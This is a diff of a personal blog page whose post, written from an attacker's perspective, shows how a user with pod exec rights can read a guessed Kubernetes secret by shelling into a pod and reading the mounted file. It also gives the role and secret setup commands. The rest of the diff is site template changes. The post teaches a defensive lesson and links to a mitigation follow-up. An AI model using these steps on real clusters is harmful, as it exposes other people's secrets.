+</span></span></code></pre></div><p>Yay, that means we guessed the secret name correctly. Let&rsquo;s gain access to the pod&rsquo;s terminal to find out the contents of the secrets:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ kubectl exec -it sleep bash
+</span></span><span style="display:flex;"><span>kubectl exec <span style="color:#f92672">[</span>POD<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>COMMAND<span style="color:#f92672">]</span> is DEPRECATED and will be removed in a future version. Use kubectl exec <span style="color:#f92672">[</span>POD<span style="color:#f92672">]</span> -- <span style="color:#f92672">[</span>COMMAND<span style="color:#f92672">]</span> instead.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>root@sleep /<span style="color:#f92672">]</span><span style="color:#75715e">#</span>
+</span></span></code></pre></div><p>Now go to the place where the secret is mounted and discover what is in secret.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>root@sleep ~<span style="color:#f92672">]</span><span style="color:#75715e"># cd /access-secret/</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>root@sleep access-secret<span style="color:#f92672">]</span><span style="color:#75715e"># cat data</span>
+</span></span><span style="display:flex;"><span>supersecretvaluesinhere
+</span></span></code></pre></div><h2 id="conclusion">Conclusion</h2>
 <p>This post was from the perspective of an attacker. It showed you how you could use guessing the secret name to gain access to any secret you like, of course, with the help of Kubelet.</p>
 <p>In the <a href="https://suraj.io/post/2021/05/access-k8s-secrets-mitigation/">next blog</a>, we will see how to detect this issue and stop it from happening.</p>
 <h2 id="background-setup">Background Setup</h2>
 <p>I used the following commands to create a user and assign permissions to that user:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kubectl create role pod-all --verb<span style="color:#f92672">=</span>* --resource<span style="color:#f92672">=</span>pods --resource<span style="color:#f92672">=</span>pods/exec
-kubectl create rolebinding pod-all:nastyuser --role<span style="color:#f92672">=</span>pod-all --user<span style="color:#f92672">=</span>nastyuser
-kubectl create secret generic supersecret --from-literal data<span style="color:#f92672">=</span>supersecretvaluesinhere
-alias kubectl<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;kubectl --as=nastyuser&#39;</span>
-</code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kubectl create role pod-all --verb<span style="color:#f92672">=</span>* --resource<span style="color:#f92672">=</span>pods --resource<span style="color:#f92672">=</span>pods/exec
+</span></span><span style="display:flex;"><span>kubectl create rolebinding pod-all:nastyuser --role<span style="color:#f92672">=</span>pod-all --user<span style="color:#f92672">=</span>nastyuser
+</span></span><span style="display:flex;"><span>kubectl create secret generic supersecret --from-literal data<span style="color:#f92672">=</span>supersecretvaluesinhere
+</span></span><span style="display:flex;"><span>alias kubectl<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;kubectl --as=nastyuser&#39;</span>
+</span></span></code></pre></div>
       </div>
       <footer>
         <div class="stats">
@@ -407,7 +411,7 @@ alias kubectl<span style="color:#f92672">=</span><span style="color:#e6db74">&#3
   <div class='post'>
     <div id="disqus_thread"></div>
 <script type="application/javascript">
-    var disqus_config = function () {
+    window.disqus_config = function () {
     
     
     
@@ -449,52 +453,52 @@ alias kubectl<span style="color:#f92672">=</span><span style="color:#e6db74">&#3
       </header>
       
       <article class="mini-post">
-          <a href="/post/2021/10/dont-be-default/" class="image" style="--bg-image: url('https://suraj.io/post/2021/10/dont-be-default/human-evolution.jpg');">
-    <img src="https://suraj.io/post/2021/10/dont-be-default/human-evolution.jpg" alt="Human Evolution">
+          <a href="/post/2021/10/dont-be-default/" class="image" style="--bg-image: url('/post/2021/10/dont-be-default/human-evolution.jpg');">
+    <img src="/post/2021/10/dont-be-default/human-evolution.jpg" alt="Human Evolution">
   </a>
         <header>
           <h2><a href="/post/2021/10/dont-be-default/">Fight Your Instincts — Your Default Behaviour is Hurting You</a></h2>
-          <time class="published" datetime="2021-10-29 11:05:07 &#43;0530 IST">October 29, 2021</time>
+          <time class="published" datetime="2021-10-29 11:05:07 &#43;0530 &#43;0530">October 29, 2021</time>
         </header>
       </article>
       
       <article class="mini-post">
-          <a href="/post/2021/10/atomic-habits/" class="image" style="--bg-image: url('https://suraj.io/post/2021/10/atomic-habits/logo.jpg');">
-    <img src="https://suraj.io/post/2021/10/atomic-habits/logo.jpg" alt="Atomic Habits">
+          <a href="/post/2021/10/atomic-habits/" class="image" style="--bg-image: url('/post/2021/10/atomic-habits/logo.jpg');">
+    <img src="/post/2021/10/atomic-habits/logo.jpg" alt="Atomic Habits">
   </a>
         <header>
           <h2><a href="/post/2021/10/atomic-habits/">Learnings from &#39;Atomic Habits&#39;</a></h2>
-          <time class="published" datetime="2021-10-26 09:21:07 &#43;0530 IST">October 26, 2021</time>
+          <time class="published" datetime="2021-10-26 09:21:07 &#43;0530 &#43;0530">October 26, 2021</time>
         </header>
       </article>
       
       <article class="mini-post">
-          <a href="/post/2021/09/unchanging-context/" class="image" style="--bg-image: url('https://suraj.io/post/2021/09/unchanging-context/cafe.jpg');">
-    <img src="https://suraj.io/post/2021/09/unchanging-context/cafe.jpg" alt="cafe">
+          <a href="/post/2021/09/unchanging-context/" class="image" style="--bg-image: url('/post/2021/09/unchanging-context/cafe.jpg');">
+    <img src="/post/2021/09/unchanging-context/cafe.jpg" alt="cafe">
   </a>
         <header>
           <h2><a href="/post/2021/09/unchanging-context/">Unchanging Contexts and Degrading Productivity</a></h2>
-          <time class="published" datetime="2021-09-11 17:09:07 &#43;0530 IST">September 11, 2021</time>
+          <time class="published" datetime="2021-09-11 17:09:07 &#43;0530 &#43;0530">September 11, 2021</time>
         </header>
       </article>
       
       <article class="mini-post">
-          <a href="/post/2021/09/cks-tips/" class="image" style="--bg-image: url('https://suraj.io/post/2021/09/cks-tips/kubernetes-security-specialist-logo-300x285.png');">
-    <img src="https://suraj.io/post/2021/09/cks-tips/kubernetes-security-specialist-logo-300x285.png" alt="cert">
+          <a href="/post/2021/09/cks-tips/" class="image" style="--bg-image: url('/post/2021/09/cks-tips/kubernetes-security-specialist-logo-300x285.png');">
+    <img src="/post/2021/09/cks-tips/kubernetes-security-specialist-logo-300x285.png" alt="cert">
   </a>
         <header>
           <h2><a href="/post/2021/09/cks-tips/">Certified Kubernetes Security Specialist CKS exam tips</a></h2>
-          <time class="published" datetime="2021-09-04 13:30:07 &#43;0530 IST">September 4, 2021</time>
+          <time class="published" datetime="2021-09-04 13:30:07 &#43;0530 &#43;0530">September 4, 2021</time>
         </header>
       </article>
       
       <article class="mini-post">
-          <a href="/post/2021/08/sapiens/" class="image" style="--bg-image: url('https://suraj.io/post/2021/08/sapiens/logo.png');">
-    <img src="https://suraj.io/post/2021/08/sapiens/logo.png" alt="Sapiens">
+          <a href="/post/2021/08/sapiens/" class="image" style="--bg-image: url('/post/2021/08/sapiens/logo.png');">
+    <img src="/post/2021/08/sapiens/logo.png" alt="Sapiens">
   </a>
         <header>
           <h2><a href="/post/2021/08/sapiens/">Learnings from &#39;Sapiens&#39;</a></h2>
-          <time class="published" datetime="2021-08-14 10:45:07 &#43;0530 IST">August 14, 2021</time>
+          <time class="published" datetime="2021-08-14 10:45:07 &#43;0530 &#43;0530">August 14, 2021</time>
         </header>
       </article>
       
@@ -731,14 +735,14 @@ alias kubectl<span style="color:#f92672">=</span><span style="color:#e6db74">&#3
   <p class="copyright">
     © 2021 Suraj Deshmukh
       <br>
-    Theme: <a href='https://github.com/pacollins/hugo-future-imperfect-slim' target='_blank' rel='noopener'>Hugo Future Imperfect Slim</a><br>A <a href='https://html5up.net/future-imperfect' target='_blank' rel='noopener'>HTML5 UP port</a> | Powered by <a href='https://gohugo.io/' title='0.92.0' target='_blank' rel='noopener'>Hugo</a>
+    Theme: <a href='https://github.com/pacollins/hugo-future-imperfect-slim' target='_blank' rel='noopener'>Hugo Future Imperfect Slim</a><br>A <a href='https://html5up.net/future-imperfect' target='_blank' rel='noopener'>HTML5 UP port</a> | Powered by <a href='https://gohugo.io/' title='0.110.0' target='_blank' rel='noopener'>Hugo</a>
   </p>
 </footer>
 <a id="back-to-top" href="#" class="fas fa-arrow-up fa-2x"></a>
 
       <script src="/js/highlight.js"></script>
     <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.6.0/languages/html.min.js"></script><script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.6.0/languages/css.min.js"></script><script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.6.0/languages/js.min.js"></script><script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.6.0/languages/toml.min.js"></script><script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.6.0/languages/shell.min.js"></script><script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.6.0/languages/bash.min.js"></script><script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.6.0/languages/go.min.js"></script>
-    <script>hljs.highlightAll();</script><script src="/js/bundle.min.adb35b4353a9ac8c661fd031a077fda48cf603dee135f96af24e8038c0c8befc.js" integrity="sha256-rbNbQ1OprIxmH9AxoHf9pIz2A97hNflq8k6AOMDIvvw="></script>
+    <script>hljs.highlightAll();</script><script src="/js/bundle.min.6ca3af096638e12dc221c7da1f69f7fcdc2032fe968d30328c2586099463171a.js" integrity="sha256-bKOvCWY44S3CIcfaH2n3/NwgMv6WjTAyjCWGCZRjFxo="></script>
     <script src="/js/add-on.js"></script>
 <script type="application/javascript">
 var doNotTrack = false;
